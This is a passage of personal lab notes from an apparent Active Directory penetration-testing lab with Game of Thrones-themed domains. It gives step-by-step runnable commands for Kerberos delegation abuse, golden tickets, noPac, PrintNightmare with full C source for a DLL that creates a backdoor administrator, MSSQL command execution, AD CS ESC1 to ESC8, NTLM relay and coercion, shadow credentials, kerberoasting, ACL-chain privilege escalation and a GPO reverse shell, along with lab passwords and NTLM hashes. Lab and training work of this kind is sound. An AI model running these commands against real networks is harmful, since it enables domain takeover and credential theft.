impacket-ticketConverter kingslanding.kirbi kingslanding.ccache
~~~

Perform a pass-the-ticket attack with Impacket's `secretdump`:

~~~shell
impacket-secretsdump -k -no-pass SEVENKINGDOMS.LOCAL/'KINGSLANDING$'@KINGSLANDING
~~~

![[north-unconstrained-delegation-pass-the-ticket.png]]

### Constrained Delegation

#### Alternative 1

Enumerate users with constrained delegation enabled:

~~~powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo | select DistinguishedName, msDS-AllowedToDelegateTo
~~~

![[north-constrained-delegation-enum-alt1.png]]

Having `jon.snow` credentials/hash it's possible to abuse constrained delegation to impersonate any user (Administrator) for the SPN `CIFS/winterfell.north.sevenkingdoms.local`

Request TGT for `jon.snow`:

~~~shell
.\Rubeus.exe asktgt /user:jon.snow /password:iknownothing /domain:north.sevenkingdoms.local /outfile:jon.snow.tgt.kirbi
~~~

![[north-constrained-delegation-tgt-alt1.png]]

Execute S4U2Self followed by a S4U2Proxy to impersonate `Administrator`:

~~~shell
.\Rubeus.exe s4u /ticket:jon.snow.tgt.kirbi /impersonateuser:administrator /domain:north.sevenkingdoms.local /msdsspn:CIFS/winterfell.north.sevenkingdoms.local /dc:north.sevenkingdoms.local /ptt
~~~

![[north-constrained-delegation-s4u-alt1.png]]

On the attacker machine, convert Base64 ticket to kirbi format to ccache format with Impacket's `ticketConverter`

~~~shell
base64 -w 0 -d jon.snow.s4u.administrator.b64 > jon.snow.s4u.administrator.kirbi
impacket-ticketConverter jon.snow.s4u.administrator.kirbi jon.snow.s4u.administrator.ccache
~~~

Run psexec with resulting ticket:

~~~shell
export KRB5CCNAME=jon.snow.s4uproxy.administrator.ccache
impacket-psexec -no-pass -k winterfell.north.sevenkingdoms.local
~~~

![[north-constrained-delegation-ptt-alt1.png]]

#### Alternative 2

Enumerate users with constrained delegation enabled:

~~~shell
impacket-findDelegation north.sevenkingdoms.local/robb.stark:sexywolfy -target-domain north.s
~~~

![[north-constrained-delegation-enum-alt2.png]]

Having `jon.snow` credentials/hash it's possible to abuse constrained delegation to impersonate any user (Administrator) for the SPN `CIFS/winterfell.north.sevenkingdoms.local`

Request TGT for `jon.snow` and execute S4U2Self followed by a S4U2Proxy to impersonate `Administrator`:

~~~shell
impacket-getST -spn CIFS/winterfell.north.sevenkingdoms.local -impersonate Administrator north.sevenkingdoms.local/jon.snow:iknownothing
~~~

![[north-constrained-delegation-tgt+s4u-alt2.png]]

Run psexec with resulting ticket:

~~~shell
export KRB5CCNAME=Administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
impacket-psexec -no-pass -k winterfell.north.sevenkingdoms.local
~~~

![[north-constrained-delegation-ptt-alt1.png]]

### Resource-based constrained delegation

Enumerate machine quota on KINGSLANDING.SEVENKINGDOMS.local:

~~~shell
nxc ldap kingslanding.sevenkingdoms.local -d SEVENKINGDOMS.local -u cersei.lannister -p il0vejaime -M maq
~~~

![[sevenkingdoms-rbcd-quota-enum.png]]

Create new computer object and it to the `msDS-AllowedToActOnBehalfOfOtherIdentity` of `KINGSLANDING$`:

~~~shell
impacket-rbcd -delegate-to 'KINGSLANDING$' -dc-ip 10.1.0.10 -action 'read' SEVENKINGDOMS/cersei.lannister:il0vejaime@kingslanding.sevenkingdoms.local

impacket-addcomputer -computer-name 'rbcdcomputer$' -computer-pass 'password' -dc-host 10.1.0.10 SEVENKINGDOMS/cersei.lannister:il0vejaime

impacket-rbcd -delegate-from 'rbcdcomputer$' -delegate-to 'KINGSLANDING$' -dc-ip 10.1.0.10 -action 'write'  SEVENKINGDOMS/cersei.lannister:il0vejaime

impacket-rbcd -delegate-to 'KINGSLANDING$' -dc-ip 10.1.0.10 -action 'read' SEVENKINGDOMS/cersei.lannister:il0vejaime
~~~

![[sevenkingdoms-rbcd-add-computer.png]]

Request a  `cifs/kingslanding.sevenkingdoms.local` TGS on behalf of Administrator to `rbcdcomputer$` that will perform `S4U`:

![[sevenkingdoms-rbcd-request-tgs.png]]

Use the TGS to authenticate as Administrator on `KINGSLANDING`:

![[sevenkingdoms-rbcd-ptt.png]]

## Lateral Movement
### Golden Ticket

#### Child domain to parent

Dump NTLM hashes and Kerberos keys:

~~~shell
impacket-secretsdump robb.stark:sexywolfy@winterfell.north.sevenkingdoms.local
~~~

![[north-golden-ticket-krbtgt.png]]

Get child domain SID:

~~~shell
nxc ldap winterfell.north.sevenkingdoms.local -u NORTH\\robb.stark -p sexywolfy --get-sid
~~~

![[north-golden-ticket-child-domain-sid.png]]

Get parent domain SID:

~~~shell
nxc ldap kingslanding.sevenkingdoms.local -u NORTH\\robb.stark -p sexywolfy --get-sid
~~~

![[north-golden-ticket-parent-domain-sid.png]]

Forge a Golden Ticket:

~~~shell
impacket-ticketer -domain 'north.sevenkingdoms.local' -domain-sid 'S-1-5-21-3880070986-3446816858-598620870' -extra-sid 'S-1-5-21-1562319857-885082017-3582239089-519' -nthash '74997deb76cf0e9e1ea194f2092127e6' 'Administrator'
~~~

![[north-golden-ticket-forging.png]]

**Note**: in SID History (`-extra-sid`) has been set the parent domain (`sevenkingdoms.local`) Enterprise Administrators group's SID (`<domain SID>-519`).

Use the forged Golden Ticket to pwn the parent domain abusing implicit trust:

~~~shell
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass north.sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local
~~~

![[north-golden-ticket-pass-the-ticket.png]]

### sAMAccountName (nopac)

#### Manually

Enumerate DC for nopac:

~~~
nxc smb essos.local -u 'khal.drogo' -p 'horse' -M nopac
~~~

![[essos-nopac-enumerate.png]]

Add a new machine account:

~~~
impacket-addcomputer -computer-name 'horse$' -computer-pass 'password' -dc-host essos.local -domain-netbios essos.local 'essos.local/khal.drogo:horse'
~~~

![[essos-nopac-addcomputer.png]]

Cleanup newly created machine account's SPNs:

~~~
python3 addspn.py --clear -t 'horse$' -u 'essos.local\khal.drogo' -p 'horse' 'meereen.essos.local'
~~~

![[essos-nopac-clean-spns.png]]

Use `renameMachine.py` to rename the newly created machine account to the target domain controller name (without $):

~~~
python3 renameMachine.py -current-name 'horse$' -new-name 'meereen' -dc-ip 'essos.local' 'essos.local'/'khal.drogo':'horse' 
~~~

![[essos-nopac-rename-computer.png]]

Request a TGT with the newly created machine account: 

~~~
impacket-getTGT -dc-ip 'essos.local' 'essos.local'/'meereen':'password'
~~~

![[essos-nopac-req-tgt.png]]

Rename  back to its original name the machine account: 

~~~
python3 renameMachine.py -current-name 'meereen' -new-name 'horse$' -dc-ip 'essos.local' 'essos.local'/'khal.drogo':'horse'
~~~

![[essos-nopac-rename-computer-back.png]]

Use the TGT to request a TGS with **S4U2Self**, abusing CVE-2021-42287; TGS will be wrongly be provided as if the TGT belong to the DC:

~~~
export KRB5CCNAME=meereen.ccache
impacket-getST -self -impersonate 'Administrator' -altservice 'cifs/meereen.essos.local' -k -no-pass -dc-ip 'essos.local' 'essos.local'/'meereen'
~~~

![[essos-nopac-s4u2self.png]]

Use TGS to dump secrets from the DC:

~~~
export KRB5CCNAME=Administrator@cifs_meereen.essos.local@ESSOS.LOCAL.ccache
impacket-secretsdump -k -no-pass -dc-ip 'essos.local' @'meereen.essos.local'
~~~

![[essos-nopac-secretdumps.png]]

Remove the machine account using Administrator hashes (`khal.drogo` has not enough privileges):

~~~
impacket-addcomputer -computer-name 'horse$' -computer-pass 'password' -dc-host essos.local -domain-netbios essos.local 'essos.local/Administrator' -hashes aad3b435b51404eeaad3b435b51404ee:b1794c0bfede743de3a1c22425c2c5e1 -delete 
~~~

![[essos-nopac-remove-computer.png]]

#### Automatically

Use `noPac.py` to automatically abuse nopac:

~~~
python3 noPac.py essos.local/khal.drogo:horse -dc-ip 10.1.0.12 --impersonate Administrator -dump
~~~

![[essos-nopac-noPac.png]]

Manually remove the computer account using Administrator hashes since `khal.drogo` has not enough privileges to do it with `noPac.py`:

~~~
impacket-addcomputer -computer-name 'WIN-MKGPXET24EF$' -dc-host essos.local  'essos.local/Administrator' -hashes aad3b435b51404eeaad3b435b51404ee:b1794c0bfede743de3a1c22425c2c5e1 -delete
~~~

![[essos-nopac-noPac-cleanup.png]]
### PrintNightmare

Check if `essos.local` is vulnerable:

~~~shell
nxc smb meereen.essos.local -u 'khal.drogo' -p 'horse' -M printnightmare
~~~

![[essos-printnightmare-check.png]]

Create a DLL that will create a backdoor user:

~~~c
#pragma comment(lib, "Netapi32.lib")
#include <windows.h> 
#include <lm.h>
#include <stdio.h>

void AddUserToWindows(const wchar_t *username, const wchar_t *password) {
    USER_INFO_1 ui;
    DWORD dwError = 0;

    // Initialize user information
    ui.usri1_name = (LPWSTR)username;
    ui.usri1_password = (LPWSTR)password;
    ui.usri1_priv = USER_PRIV_USER;  // Standard user (not admin by default)
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT; // Default user settings
    ui.usri1_script_path = NULL;

    // Add user
    NET_API_STATUS status = NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
    
    if (status == NERR_Success) {
        wprintf(L"User '%s' added successfully.\n", username);
    } else {
        wprintf(L"Failed to add user. Error code: %d\n", status);
    }
}

void AddUserToGroup(const wchar_t *username, const wchar_t *group) {
    LOCALGROUP_MEMBERS_INFO_3 lgmi;
    lgmi.lgrmi3_domainandname = (LPWSTR)username;

    // Add user to the specified group
    NET_API_STATUS status = NetLocalGroupAddMembers(NULL, group, 3, (LPBYTE)&lgmi, 1);
    
    if (status == NERR_Success) {
        wprintf(L"User '%s' added to group '%s' successfully.\n", username, group);
    } else {
        wprintf(L"Failed to add user to group '%s'. Error code: %d\n", group, status);
    }
}

int doSomeAction()
{
    const wchar_t *username = L"jack";  // Change this to the desired username
    const wchar_t *password = L"password"; // Change to a secure password
    const wchar_t *group = L"Administrators";   // Add user to Administrators group

    // Add the user
    AddUserToWindows(username, password);

    // Add user to the "Administrators" group
    AddUserToGroup(username, group);
    
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        doSomeAction();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
~~~

Compile the DLL:

~~~shell
x86_64-w64-mingw32-gcc -shared -o test.dll exploit.c -lnetapi32
~~~

Start a SMB server with Impacket's `smbserver` and use `PrintNightmare` to remotely install the DLL:

~~~shell
sudo impacket-smbserver -smb2support myshare ./

python3 printnightmare.py -dll '\\10.1.0.4\myshare\test.dll' 'khal.drogo:horse@meereen.essos.local'
~~~

![[essos-printnightmare-exploit.png]]

![[essos-printnightmare-smbserver.png]]

Check installed DLLs:

~~~shell
python3 printnightmare.py -list 'khal.drogo:horse@meereen.essos.local'
~~~

![[essos-printnightmare-list-drivers.png]]

Check if the attack was successful:

~~~shell
nxc smb meereen.essos.local -u 'jack' -p 'password' -x whoami
~~~

![[essos-printnightmare-user-created.png]]

Cleanup drivers:

~~~shell
python3 printnightmare.py -delete -name 'Microsoft XPS Document Writer v5' 'jack:password@meereen.essos.local'
python3 printnightmare.py -list 'jack:password@meereen.essos.local'
~~~

![[essos-printnightmare-cleanup-driver.png]]

Cleanup user:

~~~shell
nxc smb meereen.essos.local -u 'jack' -p 'password' -x 'net user jack /delete'
~~~

![[essos-printnightmare-cleanup-user.png]]

## MSSQL Abuse

Connect to `CASTELBLACK.NORTH.SEVENKINGDOMS.LOCAL` with Impacket's `mssqlclient`:

~~~shell
impacket-mssqlclient north.sevenkingdoms.local/samwell.tarly:Heartsbane@castelblack.north.sevenkingdoms.local -windows-auth
~~~

Check current user privileges:

~~~mssqlclient
> enum_logins
~~~

![[north_mssql_enum_logins_samwell.tarly.png]]

`samwel.tarly` **cannot enable command execution** with `xp_cmdshell` since it has not enough privileges:

~~~mssqlclient
> enable_xp_cmdshell
~~~

![[north_mssql_enable_xp_cmdshell_samwell.tarly.png]]

### Abuse impersonate privileges: as Login

Check current user impersonate privileges:

~~~mssqlclient
> enum_impersonate
~~~

![[north_mssql_enum_impersonate_samwell.tarly.png]]

`samwell.tarly` can impersonate as login the system administrator user `sa`;  impersonate `sa` login and enable `xp_cmdshell`:

~~~mssqlclient
> exec_as_login sa
> enable_xp_cmdshell
~~~

![[north_mssql_exec_as_login_sa_samwell.tarly.png]]

Execute commands on `CASTELBLACK.NORTH.SEVENKINGDOMS.LOCAL`:

~~~mssqlclient
> xp_cmdshell "whoami && hostname"
~~~

![[north_mssql_command_execution_as_sa_samwell.tarly.png]]

### Abuse impersonate privileges: as user

With previous `sa` impersonation (or try all available user and perform enumeration with each one), enumerate again impersonate privileges:

~~~mssqlclient
> enum_impersonate
~~~

![[north_mssql_enum_impersonate_sa.png]]

User `NORTH\arya.stark` has impersonate privileges as `dbo` user on `master` and `msdb`. `dbo` should have `xp_cmdshell` privileges. 

Login with `arya.stark` credentials and enumerate databases where current user is trusted:

~~~mssqlclient
> enum_db
~~~


![[north_mssql_enum_db_arya.stark.png]]

Use `msdb`:

~~~mssqlclient
> use msdb
~~~

Impersonate as user `dbo`, enable `xp_cmdshell` and run shell command

~~~mssqlclient
> exec_as_user dbo
> enable_xp_cmdshell
> xp_cmdshell "whoami && hostname" 
~~~

![[north_mssql_exec_as_user_dbo_arya.stark.png]]

### Abuse links trusts

Enumerate links:

~~~mssqlclient
> enum_links
~~~

![[north_mssql_enum_links_as_sa_dbo_arya.stark.png]]

A link exists with `BRAVOOS` and the login `NORTH\jon.snow` can log as `sa` to the remote server; login as `jon.snow` (or impersonate as login) and use the link to connect to the remote database. Being logged as `sa` to the remote SQL server, it would be possible to execute shell commands:

~~~mssqlclient
> use_link BRAAVOS
> enable_xp_cmdshell
> xp_cmdshell "whoami && hostname" 
~~~

![[north_mssql_use_link_BRAAVOS_jon.snow.png]]

### MSSQL Relay

From the mssql client, run `xp_dirtree` with SMB protocol:

~~~mssqlclient
> xp_dirtree \\10.1.0.4\notexists
~~~

![[north_BRAAVOS_mssql_relay.png]]

## AD CS

Enumerate all vulnerable certificate templates on `essos.local` with `certipy-ad`:

~~~shell
certipy-ad find -dc-ip 10.1.0.12 -u khal.drogo@essos.local -p horse -json -vulnerable
~~~

### ESC1

The template `ESC1` is found to be vulnerable to **ESC1** abuse.

![[esoss-esc1-vuln-cert.png]]

Request a certificate specifying `Administrator` as altname:

~~~shell
certipy-ad req -u khal.drogo -p horse -ca ESSOS-CA -target braavos.essos.local -template ESC1 -upn administrator@essos.local
~~~

![[essos-esc1-req.png]]

Obtain TGT and NTLM hash for `Administrator` using the certificate:

~~~shell
certipy-ad auth -pfx administrator.pfx -dc-ip 10.1.0.12
~~~

![[essos-esc1-auth.png]]

Dump secrets passing the obtained hash on `braavos.essos.local`:

~~~shell
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:b1794c0bfede743de3a1c22425c2c5e1 essos.local/administrator@braavos.essos.local
~~~

![[essos-esc1-pth-braavos.png]]

`sql_svc` password is leaked: `YouWillNotKerboroast1ngMeeeeee`.

Dump secrets passing the obtained hash on `meereen.essos.local`:

~~~shell
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:b1794c0bfede743de3a1c22425c2c5e1 administrator@essos.local
~~~

![[essos-esc1-pth-meeren.png]]
### ESC2 + ESC3

Templates `ESC3-CRA` and `ESC3` are found to be vulnerable to **ESC3** abuse.

![[esoss-esc3-vuln-cert.png]]

![[esoss-esc3-vuln-cert2.png]]

Request a certificate to the enrolling agent:

~~~shell
certipy-ad req -username khal.drogo -password horse -ca ESSOS-CA -target braavos.essos.local -template ESC3-CRA
~~~

![[esoss-esc3-req1.png]]

Request a certificate on behalf of `Administrator` using the enrolling agent provided certificate:

~~~shell
certipy-ad req -username khal.drogo -password horse -ca ESSOS-CA -target braavos.essos.local -template ESC3 -on-behalf-of 'essos\Administrator' -pfx khal.drogo.pfx
~~~

![[esoss-esc3-req2.png]]

Authenticate as `Administrator` to the DC:

~~~shell
certipy-ad auth -pfx administrator.pfx -dc-ip 10.1.0.12
~~~

![[esoss-esc3-auth.png]]

Template `ESC2` is also suitable for **ESC3** abuse since has the **Enrollment Agent** setting set to true.

![[esoss-esc2-vuln-cert.png]]

### ESC4

The template `ESC4` is found to be vulnerable to **ESC4** abuse.

![[esoss-esc4-vuln-cert.png]]

Abuse `khal.drogo` overly permissive rights on the certificate template making it vulnerable to **ESC1**:

~~~shell
certipy-ad template -dc-ip 10.1.0.12 -username khal.drogo -password horse -template ESC4 -save-old
~~~

![[esoss-esc4-edit-template.png]]

Recheck the template:

~~~shell
certipy-ad find -dc-ip 10.1.0.12 -u khal.drogo@essos.local -p horse -stdout -vulnerable
~~~

![[esoss-esc4-result.png]]

Restore the template to its original configuration:

~~~shell
certipy-ad template -dc-ip 10.1.0.12  -username khal.drogo -password horse -template ESC4 -configuration ESC4.json
~~~

![[esoss-esc4-restore-template.png]]

### ESC6

`ESSOS-CA` seems to be vulnerable to **ESC6**.

![[esoss-esc6-vuln-ca.png]]

Even though the flag `EDITF_ATTRIBUTESUBJECTALTNAME2` appears to be set, the server seems to be patched agaist this attack.


### ESC8

`ESSOS-CA` seems to be vulnerable to **ESC8**.

![[esoss-esc8-vuln-ca.png]]

Force `MEEREEN.essos.local` to authenticate against the attacker machine:

~~~shell
coercer coerce -u khal.drogo -d essos.local -p horse -t essos.local -l 10.1.0.4
~~~

Relay received credentials to the AD CS server to request a new certificate with template `DomainController`:

~~~shell
certipy-ad relay -target 'http://braavos.essos.local' -template DomainController
~~~

![[esoss-esc8-coerce-ntlm-relay.png]]

Pass the obtained hashes attack to dump credentials:
~~~shell
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:2ed16485d41a887f04791d626e77efef 'ESSOS/MEEREEN$'@essos.local
~~~

![[esoss-esc8-pth.png]]

The same result can be achieved with Impacket's `ntlmrelayx`:

~~~shell
impacket-ntlmrelayx -t 'http://braavos.essos.local/certsrv/certfnsh.asp' --adcs --template DomainController -l dumps
~~~

![[esoss-esc8-ntlmrelayx.png]]

### Shadow Credentials

##### User Account

`khal.drogo` has `GenericAll` rights on `viserys.targaryen`:

![[essos-shadow-credential-enum.png]]

Perform a Shadow Credential attack abusing these privileges:

~~~shell
certipy-ad shadow auto -username khal.drogo@essos.local -p horse -account viserys.targaryen
~~~


![[essos-shadow-credential-exploit.png]]

Use obtained ticket to perform some other operations:

~~~shell
export KRB5CCNAME=viserys.targaryen.ccache
impacket-GetADUsers -k -no-pass essos.local/viserys.targaryen -all
~~~

![[essos-shadow-credential-ptt.png]]

##### Computer Account

Since a computer object can set the `msDS-KeyCredentialLink` for itself if it's not already set, perform a Shadow Credential relay attack:

~~~shell
coercer coerce -u khal.drogo -d essos.local -p horse -t braavos.essos.local -l 10.1.0.4
~~~

~~~shell
impacket-ntlmrelayx -t ldaps://meereen.essos.local --shadow-credentials --shadow-target 'BRAAVOS$' --remove-mic -smb2support --no-validate-privs
~~~

![[essos-shadow-credential-relay.png]]

Note that, since DC is a Windows Server 2016, it's vulnerable to **CVE-2019-1019** (drop-the-mic); this allows to relay credentials from SMB to LDAP.

Decrypt the output pfx in order to use it with `certipy-ad` to authenticate to the DC:

~~~shell
certipy-ad cert -pfx i5XJWpcU.pfx -password "r4gPME65qEZuiiLomZya" -export -out 'BRAAVOS$.pfx'
certipy-ad auth -pfx BRAAVOS\$.pfx -dc-ip 10.1.0.12 -u 'BRAAVOS$' -domain essos.local
~~~

![[essos-shadow-credential-relay-auth.png]]

### Certifried

Being the AD CS server a Windows 2019, it could be vulnerable to CVE-2022–26923.

Add a machine account with a spoofed `dNSHostName` with `certipy-ad`:

~~~shell
certipy-ad account create -u khal.drogo@essos.local -p horse -user 'certifried$' -dns 'meereen.essos.local' -dc-ip 10.1.0.12
~~~

![[essos-certifried-create-account.png]]

Request a certificate for the created machine account:

~~~shell
certipy-ad req -u 'certifried$'@essos.local -p 'lityYSptCNMMfzGn' -ca ESSOS-CA -template Machine -target braavos.essos.local -debug
~~~

![[essos-certifried-req-certificate.png]]

Authenticate with the certificate:

~~~shell
certipy-ad auth -pfx meereen.pfx -dc-ip 10.1.0.12
~~~

![[essos-certifried-create-account.png]]

Pass the hash with Impacket's `secretsdump`:

~~~shell
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:2ed16485d41a887f04791d626e77efef 'ESSOS.local/MEEREEN$'@meereen.essos.local
~~~

![[essos-certifried-pth.png]]


## ACL Abuses

### GPO Abuse

~~~
Get-GPO -All
~~~

![[north-gpo-enumeration.png]]

~~~powershell
Get-GPPermission -Name "StarkWallpaper" -All
~~~

![[north-gpo-permissions-enumeration.png]]

`samwell.tarly` has read and write permission on the `StarkWallpaper` GPO.

`samwell.tarly` cannot RDP to 10.1.0.11; having its password, it's possible to inject its network credentials using `runas` and open the **Microsoft Management Console** (`mmc.exe`) from another user session in order to edit the GPO:

~~~shell
runas.exe /netonly /user:NORTH\samwell.tarly mmc.exe
~~~

![[north-gpo-startup-script.png]]

The script `reverse.ps1` will open a reverse shell each time a user logs in.

Note that this GPO applies to all authenticated users:

![[north-gpo-security-filtering.png]]

Force GPO applying:

~~~shell
gpupdate /force
~~~


### LAPS Password

While doing some enumeration, the group SPY is found to have `ReadLAPSPassword` privileges, allowing members to read LAPS password for BRAAVOS.

![[braavos-bloodhoud-spy-readlapspassword.png]]

Get LAPS password :

~~~shell
# With pyLAPS
python3 ./pyLAPS.py --action get -d "SEVENKINGDOMS.local" -u "cersei.lannister" -p "il0vejaime" --dc-ip 10.1.0.12

# With NetExec
nxc ldap 10.1.0.12  -u 'SEVENKINGDOMS.local\cersei.lannister' -p il0vejaime --module laps
~~~

![[braavos-get-laps-password-1.png]]

### Targeted Kerberoast

Enumerating `missandei` rights with `BloodHound`, it's noticed that this account has `GenericAll` permissions on `khal.drogo`; this allows to perform a targeted kerberoast attack against this user.

![[essos-targetedkerberoast-enum.png]]

~~~shell
targetedKerberoast.py -v -d 'essos.local' -u 'missandei' -p 'fr3edom'
~~~

![[essos-targetedkerberoast.png]]

Cracking `khal.drogo` TGS:

~~~shell
hashcat -m 13100 khaldogo.targetedkerberoasting /usr/share/wordlists/rockyou.txt
~~~

![[essos-targetedkerberoast-crack.png]]

Password for `khal.drogo` is `horse`.


### Force Change Password

Since `khal.drogo` has `GenericAll` rights on `viserys.targaryen`, it can also force a password change for this account:

![[essos-shadow-credential-enum.png]]


Set a new password for `viserys.targaryen` with `net`; new password will be `password`:

~~~shell
net rpc password "viserys.targaryen" -U "essos.local"/"khal.drogo" -S "meereen.essos.local"
~~~

![[acl-force-change-password-change-password.png]]

Check new credentials are valid with `NetExec`:

~~~shell
nxc smb meereen.essos.local -u 'viserys.targaryen' -p 'password'
~~~

![[acl-force-change-password-check-password.png]]

### ACL Chain 1

![[acl-chain-1-path.png]]


`tywin.lannister` -> `ForceChangePassword` -> `jaime.lannister`

Force change password with `net`:

~~~shell
net rpc password "jaime.lannister" -U "sevenkingdoms.local"/"tywin.lannister" -S "kingslanding.sevenkingdoms.local"
~~~

![[acl-chain-1-change-password.png]]

`jaime.lannister` -> `GenericWrite` -> `joffrey.baratheon`


Perform a targeted kerberoasting attack with `targetedKerberoast.py`:

~~~shell
python3 targetedKerberoast.py -v -d 'sevenkingdoms.local' -u 'jaime.lannister' -p 'password123'
~~~

![[acl-chain-1-targeted-kerberoasting.png]]

Crack the recovered hash with `hashcat`:

~~~shell
hashcat -m 13100 jeoffrey.baratheon.txt /usr/share/wordlists/rockyou.txt 
~~~

![[acl-chain-1-ticket-cracking.png]]

`jeoffrey.baratheon` -> `WriteDacl` -> `tyron.lannister`

Edit DACL on `tyron.lannister` adding `FullControl` for  `jeoffrey.baratheon` with Impacket's `dacledit`:

~~~shell
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'joffrey.baratheon' -target 'tyron.lannister' 'sevenkingdoms.local'/'joffrey.baratheon':'1killerlion'
~~~

![[acl-chain-1-dacl-edit.png]]

Perform a shadow credentials attack with `certipy-ad` abusing granted `FullControl` privileges:

~~~shell
certipy-ad shadow auto -username joffrey.baratheon@sevenkingdoms.local -p 1killerlion -account tyron.lannister
~~~

![[acl-chain-1-shadow-credentials.png]]

Pass-the-ticket to check authentication against the DC:

~~~shell
export KRB5CCNAME=tyron.lannister.ccache 
nxc smb kingslanding.sevenkingdoms.local -u tyron.lannister -k --use-kcache
~~~

![[acl-chain-1-shadow-credentials-check.png]]

Restore DACL with Impacket's `dacledit`:

~~~shell
impacket-dacledit -action 'restore' -file dacledit-20250317-082720.bak -target 'tyron.lannister' 'sevenkingdoms.local'/'joffrey.baratheon':'1killerlion'
~~~

![[acl-chain-1-dacl-restore.png]]

### ACL Chain 2

![[acl-chain-2-path.png]]


`tyron.lannister` -> `AddSelf` -> `Small Council`

Abuse `AddSelf` right by adding `tyron.lannister` to `Small Council` with `bloodyAD`:

~~~shell
bloodyAD --host "10.1.0.10" -d "sevenkingdoms.local" -u "tyron.lannister" -p "aad3b435b51404eeaad3b435b51404ee:b3b3717f7d51b37fb325f7e7d048e998" add groupMember "Small Council" "tyron.lannister"
~~~

![[acl-chain-2-addself-smallcouncil.png]]

`SmallCouncil` -> `AddMember` -> `DragonStone`

Since `Small Council` can `AddMember` on `DragonStone`, `tyron.lannister` can now add himself to the latter using `bloodyAD`:

~~~shell
bloodyAD --host "10.1.0.10" -d "sevenkingdoms.local" -u "tyron.lannister" -p "aad3b435b51404eeaad3b435b51404ee:b3b3717f7d51b37fb325f7e7d048e998" add groupMember "DragonStone" "tyron.lannister"
~~~

![[acl-chain-2-addmember-dragonstone.png]]

`DragonStone` -> `WriteOwner` -> `KingsGuard`

Since `DragonStone` can `WriteOwner` on `KingsGuard`, `tyron.lannister` can now set himself as the owner to the latter using Impacket's `owneredit`:

~~~shell
impacket-owneredit -action write -new-owner 'tyron.lannister' -target 'KingsGuard' -hashes aad3b435b51404eeaad3b435b51404ee:b3b3717f7d51b37fb325f7e7d048e998 'sevenkingdoms.local'/'tyron.lannister'
~~~

![[acl-chain-2-check-owner.png]]

Confirm current owner is `tyron.lannister`:

~~~shell
impacket-owneredit -action read -target 'KingsGuard' -hashes aad3b435b51404eeaad3b435b51404ee:b3b3717f7d51b37fb325f7e7d048e998 'sevenkingdoms.local'/'tyron.lannister'
~~~

![[acl-chain-2-change-owner.png]]

Now that `tyron.lannister` owns `KingsGuard`, can grant himself `WriteMembers` rights:

~~~shell
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'tyron.lannister' -target 'KingsGuard' -hashes aad3b435b51404eeaad3b435b51404ee:b3b3717f7d51b37fb325f7e7d048e998 'sevenkingdoms.local'/'tyron.lannister' 2>/dev/null
~~~

![[acl-chain-2-add-writemembers-kingsguard.png]]

And then, he can add himself to `KingsGuard` with `bloodAD`:

~~~shell
bloodyAD --host "10.1.0.10" -d "sevenkingdoms.local" -u "tyron.lannister" -p "aad3b435b51404eeaad3b435b51404ee:b3b3717f7d51b37fb325f7e7d048e998" add groupMember "KingsGuard" "tyron.lannister"
~~~

![[acl-chain-2-add-member-kingsguard.png]]

Being part of `KingsGuard`, `tyron.lannister` can perform a shadow credentials attack on `stannis.baratheon`:

~~~shell
certipy-ad shadow auto -username tyron.lannister@sevenkingdoms.local -hashes aad3b435b51404eeaad3b435b51404ee:b3b3717f7d51b37fb325f7e7d048e998 -account stannis.baratheon
~~~

![[acl-chain-2-shadow-credentials-stannisbaratheon.png]]

`stannis.baratheon` -> `GenericAll` -> `kingslanding.sevenkingdoms.local`

Since `stannis.baratheon` has `GenericAll` rights on `kingslanding.sevenkingdoms.local`, it's possible to perform resource-based constrained delegation to impersonate a domain admin and pwn the DC:

![[acl-chain-2-stannisbaratheon-genericall-kingslanding.png]]


### GenericWrite - profilePath

Since `jaime.lannister` has `GenericWrite` permissions on `joffrey.baratheon`, she can edit any attribute, such has `profilePath` that will be set to a user controlled SMB server:

~~~shell
bloodyAD --host "10.1.0.10" -d "sevenkingdoms.local" -u "jaime.lannister" -p "password123" set object 'joffrey.baratheon' profilePath -v '//10.1.0.4/share'
~~~

Simulate a RDP connection with `joffrey.baratheon` in order to intercept the NTLM hashes with `responder`:

![[acl-generic-write-profilePath.png]]